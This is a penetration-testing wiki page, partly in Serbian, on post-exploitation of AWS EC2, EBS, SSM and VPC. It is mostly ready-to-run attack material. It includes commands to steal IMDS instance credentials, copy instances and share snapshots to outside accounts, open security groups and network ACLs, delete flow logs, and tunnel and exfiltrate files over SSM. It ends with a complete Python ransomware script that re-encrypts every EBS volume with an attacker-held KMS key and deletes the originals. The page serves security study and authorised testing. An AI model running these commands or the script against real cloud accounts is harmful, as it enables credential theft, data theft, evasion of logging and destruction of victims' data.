# AWS - EC2, EBS, SSM & VPC Post-eksploatacija

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

Za više informacija pogledajte:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring **duplicira dolazni i odlazni saobraćaj za EC2 instances unutar VPC-a** bez potrebe za instalacijom bilo čega na samim instancama. Ovaj duplicirani saobraćaj se obično šalje nečemu poput sistema za detekciju mrežnih upada (IDS) za analizu i nadzor. Napadač bi mogao zloupotrebiti ovo da presretne sav saobraćaj i dobije osetljive informacije iz njega:

Za više informacija pogledajte ovu stranicu:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Kopiranje pokrenute instance

Instances obično sadrže neku vrstu osetljivih informacija. Postoje različiti načini da se uđe u njih (check [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)). Ipak, drugi način da proverite šta sadrže je da **kreirate AMI i pokrenete novu instancu (čak i u svom nalogu) iz nje**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshots are backups of volumes**, koji obično sadrže **osetljive informacije**, zato njihova provera treba da otkrije te podatke.\
Ako pronađete **volume without a snapshot** možete: **Create a snapshot** i izvršiti sledeće radnje ili jednostavno **mount it in an instance** unutar naloga:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

Export an EC2 AMI straight to S3 using `CreateStoreImageTask` to obtain a raw disk image without snapshot sharing. Ovo omogućava potpunu offline forenziku ili krađu podataka, a da pri tom networking instance ostane neizmenjen.

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

Attach an io1/io2 Multi-Attach volume to a second instance and mount it read-only to siphon live data without snapshots. Korisno kada victim volume već ima Multi-Attach omogućen u istoj AZ.

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

Create an EC2 Instance Connect Endpoint, authorize ingress, and inject ephemeral SSH keys to access private instances over a managed tunnel. Omogućava brze lateralne pokrete bez otvaranja javnih portova.

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

Move a victim ENI’s secondary private IP to an attacker-controlled ENI to impersonate trusted hosts that are allowlisted by IP. Omogućava zaobilaženje unutrašnjih ACL-ova ili SG pravila koja su vezana za određene adrese.

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

Reassociate an Elastic IP from the victim instance to the attacker to intercept inbound traffic or originate outbound connections that appear to come from trusted public IPs.

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

If a security group rule references a customer-managed prefix list, adding attacker CIDRs to the list silently expands access across every dependent SG rule without modifying the SG itself.

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

Create gateway or interface VPC endpoints to regain outbound access from isolated subnets. Leveraging AWS-managed private links bypasses missing IGW/NAT controls for data exfiltration.

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### `ec2:AuthorizeSecurityGroupIngress`

An attacker with the ec2:AuthorizeSecurityGroupIngress permission can add inbound rules to security groups (for example, allowing tcp:80 from 0.0.0.0/0), thereby exposing internal services to the public Internet or to otherwise unauthorized networks.
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
```
# `ec2:ReplaceNetworkAclEntry`
Napadač sa ec2:ReplaceNetworkAclEntry (ili sličnim) privilegijama može izmeniti subnet-ove Network ACLs (NACLs) kako bi ih učinio veoma permisivnim — na primer dozvoljavajući 0.0.0.0/0 na kritičnim portovima — izlažući ceo opseg subnet-a Internetu ili neautorizovanim mrežnim segmentima. Za razliku od Security Groups, koje se primenjuju po instanci, NACLs se primenjuju na nivou subnet-a, tako da promena restriktivnog NACL-a može imati mnogo veći blast radius omogućavajući pristup mnogo većem broju hostova.
```bash
aws ec2 replace-network-acl-entry \
--network-acl-id <ACL_ID> \
--rule-number 100 \
--protocol <PROTOCOL> \
--rule-action allow \
--egress <true|false> \
--cidr-block 0.0.0.0/0
```
### `ec2:Delete*`

Napadač sa ec2:Delete* i iam:Remove* permisijama može obrisati kritične infrastrukturne resurse i konfiguracije — na primer key pairs, launch templates/versions, AMIs/snapshots, volumes or attachments, security groups or rules, ENIs/network endpoints, route tables, gateways, or managed endpoints. Ovo može izazvati trenutni prekid servisa, gubitak podataka i gubitak forenzičkih dokaza.

One example is deleting a security group:

aws ec2 delete-security-group \
--group-id <SECURITY_GROUP_ID>

### VPC Flow Logs Cross-Account Exfiltration

Usmerite VPC Flow Logs ka S3 bucket-u koji kontroliše napadač da kontinuirano prikuplja network metadata (source/destination, ports) izvan naloga žrtve za long-term reconnaissance.

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

Čak i ako zaključate EC2 tako da nijedan saobraćaj ne može da izađe, on i dalje može **exfil via DNS**.

- **VPC Flow Logs will not record this**.
- Nemate pristup AWS DNS logs.
- Onemogućite ovo postavljanjem "enableDnsSupport" na false pomoću:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

Napadač može pozvati API endpoint-e naloga kojim on upravlja. Cloudtrail će zabeležiti te pozive i napadač će moći da vidi exfiltrate data u Cloudtrail logovima.

### Open Security Group

Možete dobiti dodatni pristup mrežnim servisima otvaranjem portova ovako:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

It's possible to run an EC2 instance an register it to be used to run ECS instances and then steal the ECS instances data.

For [**more information check this**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### ECS-on-EC2 IMDS Abuse & ECS Agent Impersonation

Kompromitovanje bilo kog ECS taska koji radi na EC2 container instance obično je dovoljno da pivotuješ u ulogu hosta i u IAM role povezane sa svim ostalim taskovima na tom nodu. Pošto ne postoji **task isolation for ECS-on-EC2**, svaki task po defaultu može da upita EC2 Instance Metadata Service (IMDS), ukrade container instance profile, i zatim koristi isti WebSocket protokol koji ECS agent koristi prema control plane-u (primitiv **ECScape**) da zatraži kredencijale za svaki task koji je trenutno zakazan na tom hostu. Latacora je dokumentovala ovaj tok rada u njihovom [ECS-on-EC2 IMDS research](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/), koji sledeći ofanzivni rezime kondenzuje.

#### Attack chain

1. **Steal the instance profile from inside the container.** Assume IMDSv2 is required, so request a token and then fetch the profile.

```bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/{InstanceProfileName}
```
2. **Use the container instance role to impersonate the ECS agent.** With those credentials you can speak the undocumented WebSocket channel the ECS agent uses; the control plane trusts you as the real agent and delivers **all task IAM credentials** to your process. You can now run higher-privileged tasks locally, dump task environment secrets, or update services/tasks to redeploy workloads you can fully inspect.

#### IMDS reachability with IMDSv2 + hop limit 1

Podesavanje IMDSv2 sa `HttpTokens=required` i `HttpPutResponseHopLimit=1` blokira samo taskove koji se nalaze iza dodatnog hopa (Docker bridge). Ostali network modovi ostaju u okviru jednog hop-a od Nitro controllera i i dalje dobijaju odgovore:

| ECS network mode | IMDS reachable? | Reason |
| --- | --- | --- |
| `awsvpc` | ✅ | Svaki task dobija svoj ENI koji je još uvek jedan hop udaljen od IMDS, pa tokeni i odgovori metapodataka uspešno stignu. |
| `host` | ✅ | Taskovi dele host namespace, tako da vide istu udaljenost u hop-ovima kao EC2 instanca. |
| `bridge` | ❌ | Odgovori umiru na Docker bridge jer taj dodatni hop iscrpljuje hop limit. |

Zato, **nikada ne pretpostavljaj da hop limit 1 štiti awsvpc ili host-mode workload-ove**—uvek testiraj iznutra, iz svojih kontejnera.

#### Detecting IMDS blocks per network mode

- **awsvpc tasks:** Security groups, NACLs, ili podešavanja rutiranja ne mogu blokirati link-local adresu 169.254.169.254 jer je Nitro ubacuje na hostu. Proveri `/etc/ecs/ecs.config` za `ECS_AWSVPC_BLOCK_IMDS=true`. Ako je flag odsutan (podrazumevano) možeš curl-ovati IMDS direktno iz taska. Ako je postavljen, pivotuj u host/agent namespace da ga isključiš ili pokreni tooling izvan awsvpc.

- **bridge mode:** Kada zahtevi za metapodatke zakažu iako je hop limit 1 konfigurisan, odbrambeni tim verovatno ubacio `DOCKER-USER` drop pravilo kao npr. `--in-interface docker+ --destination 169.254.169.254/32 --jump DROP`. Listanje `iptables -S DOCKER-USER` otkriva pravilo, a root pristup ti omogućava da obrišeš ili promeniš redosled pravila pre nego što upitaš IMDS.

- **host mode:** Proveri agent konfiguraciju za `ECS_ENABLE_TASK_IAM_ROLE_NETWORK_HOST=false`. Ta opcija potpuno uklanja task IAM role, tako da moraš ili ponovo omogućiti tu opciju, preći na awsvpc taskove, ili preuzeti kredencijale kroz neki drugi proces na hostu. Kada je vrednost `true` (podrazumevano), svaki host-mode proces—uključujući kompromitovane kontejnere—može da pristupi IMDS osim ako nisu primenjeni prilagođeni eBPF/cgroup filteri koji ciljaju `169.254.169.254`; traži tc/eBPF programe ili iptables pravila koja referenciraju tu adresu.

Latacora čak objavila [Terraform validation code](https://github.com/latacora/ecs-on-ec2-gaps-in-imds-hardening) koji možeš pokrenuti u ciljnom accountu da izbrojiš koji network modovi i dalje izlažu metapodatke i prema tome isplaniraš sledeći korak.

Kada razumeš koji modovi izlažu IMDS, možeš isplanirati svoj post-exploitation put: ciljaj bilo koji ECS task, zatraži instance profile, predstavi se kao agent i preuzmi sve ostale task role za lateralno kretanje ili persistance unutar klastera.

### Uklanjanje VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Potrebne dozvole:

- `ssm:StartSession`

Pored izvršavanja komandi, SSM omogućava tunelovanje saobraćaja, što se može zloupotrebiti za pivot sa EC2 instanci koje nemaju mrežni pristup zbog Security Groups ili NACLs.
Jedan od scenarija u kojima je ovo korisno je pivoting sa [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) na privatni EKS cluster.

> Da biste započeli sesiju, potrebno je da imate instaliran SessionManagerPlugin: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. Instalirajte SessionManagerPlugin na vašem računaru
2. Prijavite se na Bastion EC2 koristeći sledeću komandu:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Nabavite privremene AWS credentials za Bastion EC2 koristeći skriptu [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment)
4. Prebacite credentials na svoj računar u fajl `$HOME/.aws/credentials` kao profil `[bastion-ec2]`
5. Prijavite se na EKS kao Bastion EC2:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. Ažurirajte polje `server` u fajlu `$HOME/.kube/config` da ukazuje na `https://localhost`
7. Kreirajte SSM tunel na sledeći način:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. Saobraćaj iz alata `kubectl` je sada preusmeren kroz SSM tunel preko Bastion EC2 i možete pristupiti privatnom EKS klasteru sa svoje mašine pokretanjem:
```shell
kubectl get pods --insecure-skip-tls-verify
```
Note that the SSL connections will fail unless you set the `--insecure-skip-tls-verify ` flag (or its equivalent in K8s audit tools). Seeing that the traffic is tunnelled through the secure AWS SSM tunnel, you are safe from any sort of MitM attacks.

Na kraju, ova tehnika nije specifična samo za napade na privatne EKS klastere. Možete podesiti proizvoljne domene i portove da pivotujete na bilo koji drugi AWS servis ili prilagođenu aplikaciju.

---

#### Brzo lokalno ↔️ udaljeno prosleđivanje portova (AWS-StartPortForwardingSession)

Ako treba da prosledite samo **jedan TCP port sa EC2 instance na vaš lokalni host** možete koristiti `AWS-StartPortForwardingSession` SSM document (no remote host parameter required):
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
Komanda uspostavlja dvosmerni tunel između vaše radne stanice (`localPortNumber`) i izabranog porta (`portNumber`) na instanci **bez otvaranja bilo kojih dolaznih Security-Group pravila**.

Uobičajeni slučajevi upotrebe:

* **File exfiltration**
1. Na instanci pokrenite brz HTTP server koji pokazuje na direktorijum koji želite da izvučete:

```bash
python3 -m http.server 8000
```

2. Sa vaše radne stanice preuzmite fajlove preko SSM tunela:

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **Pristup unutrašnjim web aplikacijama (e.g. Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
Savet: Compress and encrypt dokaze pre exfiltrating-a kako CloudTrail ne bi beležio clear-text content:
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### Deljenje AMI
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Pretraživanje osetljivih informacija u javnim i privatnim AMIs

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel is a tool designed to **pretraživanje osetljivih informacija unutar javnih ili privatnih Amazon Machine Images (AMIs)**. Automatizuje proces pokretanja instanci iz ciljnih AMIs, montiranja njihovih volumena i skeniranja radi pronalaska potencijalnih tajni ili osetljivih podataka.

### Deljenje EBS Snapshot
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

Proof of concept sličan Ransomware demonstraciji iz S3 post-exploitation beleški. KMS bi trebalo preimenovati u RMS (Ransomware Management Service), s obzirom na to koliko je lako koristiti ga za enkriptovanje različitih AWS servisa.

Prvo, iz 'attacker' AWS naloga, kreirajte customer managed key u KMS. Za ovaj primer, pustićemo AWS da upravlja key podacima za nas, ali u realističnoј situaciji malicious actor bi zadržao key podatke van kontrole AWS-a. Promenite key policy tako da dozvoljava bilo kom AWS account Principal da koristi ključ. Za ovu key policy, ime naloga je bilo 'AttackSim', a pravilo politike koje dozvoljava potpuni pristup zove se 'Outside Encryption'
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Pravilo key policy mora imati sledeće omogućeno da bi se moglo koristiti za enkripciju EBS volumena:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Sada, sa javno dostupnim ključem za korišćenje. Možemo iskoristiti 'victim' nalog koji ima pokrenute neke EC2 instance sa priključenim nekriptovanim EBS volumima. EBS volumeni tog 'victim' naloga su meta naše enkripcije; ovaj napad se izvodi pod pretpostavkom kompromitovanja AWS naloga sa visokim privilegijama.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

Slično primeru S3 ransomware-a. Ovaj napad će kreirati kopije prikačenih EBS volumena koristeći snapshots, koristiti javno dostupan ključ iz 'attacker' naloga da enkriptuje nove EBS volumene, zatim odvojiti originalne EBS volumene od EC2 instanci i obrisati ih, i na kraju obrisati snapshots koji su korišćeni za kreiranje novih enkriptovanih EBS volumena. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

Rezultat je da u nalogu ostanu samo enkriptovani EBS volumeni.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Takođe vredi napomenuti da je skripta zaustavila EC2 instance kako bi odvojila i obrisala originalne EBS volumene. Originalni nekriptovani volumeni su sada nestali.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Zatim se vratite na key policy u 'attacker' nalogu i uklonite pravilo politike 'Outside Encryption' iz key policy-ja.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Sačekajte trenutak da se novo postavljena key policy propagira. Zatim se vratite na 'victim' nalog i pokušajte da prikačite jedan od novo enkriptovanih EBS volumena. Videćete da možete prikačiti volumen.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Međutim, kada pokušate da zaista pokrenete EC2 instance sa enkriptovanim EBS volumenom, to će jednostavno da zakaže i instanca će iz stanja 'pending' vratiti u stanje 'stopped' zauvek, pošto prikačeni EBS volumen ne može biti dekriptovan pomoću ključa jer key policy više to ne dozvoljava.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Ovo je python skripta koja je korišćena. Prima AWS creds za 'victim' nalog i javno dostupnu AWS ARN vrednost za ključ koji će se koristiti za enkripciju. Skripta će napraviti enkriptovane kopije SVIH dostupnih EBS volumena prikačenih na SVE EC2 instance u ciljanom AWS nalogu, potom zaustaviti svaku EC2 instancu, odvojiti originalne EBS volumene, obrisati ih i na kraju obrisati sve snapshots korišćene tokom procesa. Ovo će ostaviti samo enkriptovane EBS volumene u ciljanom 'victim' nalogu. KORISTITE OVU SKRIPTU SAMO U TEST OKRUŽENJU, ONA JE DESTRUKTIVNA I OBRISAĆE SVE ORIGINALNE EBS VOLUME. Možete ih povratiti koristeći korišćeni KMS key i vratiti ih u prvobitno stanje preko snapshots-a, ali samo želim da vas upozorim da je ovo na kraju dana ransomware PoC.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## Izvori

- [Latacora - ECS on EC2: Pokrivanje praznina u IMDS Hardening](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/)
- [Latacora ecs-on-ec2-gaps-in-imds-hardening Terraform repo](https://github.com/latacora/ecs-on-ec2-gaps-in-imds-hardening)
- [Pentest Partners – Kako preneti fajlove u AWS koristeći SSM](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
